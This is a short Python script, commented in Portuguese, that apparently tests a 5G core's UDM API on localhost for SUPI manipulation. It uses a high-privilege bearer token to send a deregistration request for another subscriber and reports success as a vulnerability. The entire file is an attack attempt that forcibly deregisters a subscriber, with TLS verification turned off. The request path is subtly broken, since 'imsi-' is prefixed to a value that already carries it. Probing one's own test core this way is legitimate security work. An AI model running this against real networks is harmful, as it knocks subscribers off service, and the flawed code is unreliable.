import requests
import urllib3
import json

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

#Configurações do teste
UDM_API_URL_BASE = "https://127.0.0.1:29503/nudm-uecm/v1/ues"
HEADERS = {"Content-Type": "application/json", "Authorization": "Bearer [TOKEN_DA_NF_ALTA_PRIVILEGIO]"}

LEGIT_SUPI = "imsi-208930000000001"
TARGET_SUPI = "imsi-208930000000002"

print("[+] Testando manipulação de SUPI a nível de API...")

try:
    api_url = f"{UDM_API_URL_BASE}/imsi-{TARGET_SUPI}/deregistrations"
    payload = {"deregisterReason": "UE_is_out_of_coverage"}
    
    print(f"[*] Tentando desregistrar o assinante com SUPI: {TARGET_SUPI}")
    response = requests.post(api_url, headers=HEADERS, data=json.dumps(payload), verify=False, timeout=5)
    
    if response.status_code == 204:
        print("[!!!] VULNERABILIDADE DETECTADA: Manipulação de SUPI bem-sucedida!")
        print("      O atacante conseguiu desregistrar um assinante com um SUPI diferente.")
    elif response.status_code == 403 or response.status_code == 401:
        print("[+] Manipulação de SUPI falhou. O acesso foi negado.")
    else:
        print(f"[-] Resposta inesperada: {response.status_code}")

except requests.exceptions.RequestException as e:
    print(f"[-] Erro ao tentar manipular o SUPI: {e}")